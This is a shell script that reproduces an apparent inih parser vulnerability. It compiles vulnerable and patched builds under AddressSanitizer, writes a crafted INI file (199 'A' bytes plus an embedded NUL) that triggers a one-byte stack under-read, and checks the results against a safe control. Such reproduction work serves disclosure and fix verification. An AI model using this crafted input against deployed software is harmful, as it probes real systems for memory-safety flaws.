#!/bin/sh
# Reproduce inih CVE-2025-71450 on pinned r62 / r63 source, local file input.
# Run from this directory. Raw output goes to runs/.
set -u
cd "$(dirname "$0")" || exit 1

for pin in r62 r63; do
    gcc -fsanitize=address -fno-omit-frame-pointer -O0 -g \
        -I "src/inih-$pin" harness.c "src/inih-$pin/ini.c" \
        -o "harness-asan-$pin" || exit 1
    gcc -fno-omit-frame-pointer -O0 -g \
        -I "src/inih-$pin" harness.c "src/inih-$pin/ini.c" \
        -o "harness-plain-$pin" || exit 1
done

# Attack: first fgets(line,200) consumes 199 'A' bytes (INI_MAX_LINE-1, no
# newline); the discard loop then fgets(abyss,16) consumes the embedded NUL,
# leaving strlen(abyss)==0 and reading abyss[-1] in vulnerable r62.
dd if=/dev/zero bs=1 count=199 2>/dev/null | tr '\000' 'A' > evidence/attack.ini
printf '\000' >> evidence/attack.ini
# Safe control: same 199-byte line but properly terminated; no discard loop.
dd if=/dev/zero bs=1 count=199 2>/dev/null | tr '\000' 'A' > evidence/safe.ini
printf '\nkey=value\n' >> evidence/safe.ini

run_case() {
    name=$1
    bin=$2
    input=$3
    ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 \
        "./$bin" "evidence/$input" > "runs/$name.out" 2>&1
    printf '%s\n' "$?" > "runs/$name.rc"
}

run_case r62-attack-asan harness-asan-r62 attack.ini
run_case r63-attack-asan harness-asan-r63 attack.ini
run_case r62-safe-asan harness-asan-r62 safe.ini
run_case r63-safe-asan harness-asan-r63 safe.ini
run_case r62-attack-plain harness-plain-r62 attack.ini

pass=0
fail=0
check() {
    label=$1
    expected=$2
    got=$3
    if [ "$got" = "$expected" ]; then
        printf 'PASS %s: %s\n' "$label" "$got"
        pass=$((pass + 1))
    else
        printf 'FAIL %s: expected %s got %s\n' "$label" "$expected" "$got"
        fail=$((fail + 1))
    fi
}

check "r62-attack-asan-underflow" yes \
    "$(grep -q 'AddressSanitizer: stack-buffer-underflow' runs/r62-attack-asan.out && echo yes || echo no)"
check "r62-attack-asan-sink" yes \
    "$(grep -q 'ini.c:16[0-9]' runs/r62-attack-asan.out && echo yes || echo no)"
check "r62-attack-asan-rc" 1 "$(cat runs/r62-attack-asan.rc)"
check "r63-attack-asan-clean" yes \
    "$(grep -q 'AddressSanitizer' runs/r63-attack-asan.out && echo no || echo yes)"
check "r63-attack-asan-rc" 0 "$(cat runs/r63-attack-asan.rc)"
check "r62-safe-asan-clean" yes \
    "$(grep -q 'AddressSanitizer' runs/r62-safe-asan.out && echo no || echo yes)"
check "r63-safe-asan-clean" yes \
    "$(grep -q 'AddressSanitizer' runs/r63-safe-asan.out && echo no || echo yes)"
check "r62-attack-plain-no-crash-negative" 0 "$(cat runs/r62-attack-plain.rc)"
printf 'NOTE: the plain build exits 0; the one-byte under-read is only\n'
printf 'observable under ASan. No rung-1 crash claim.\n'
printf 'PASS=%d FAIL=%d\n' "$pass" "$fail"
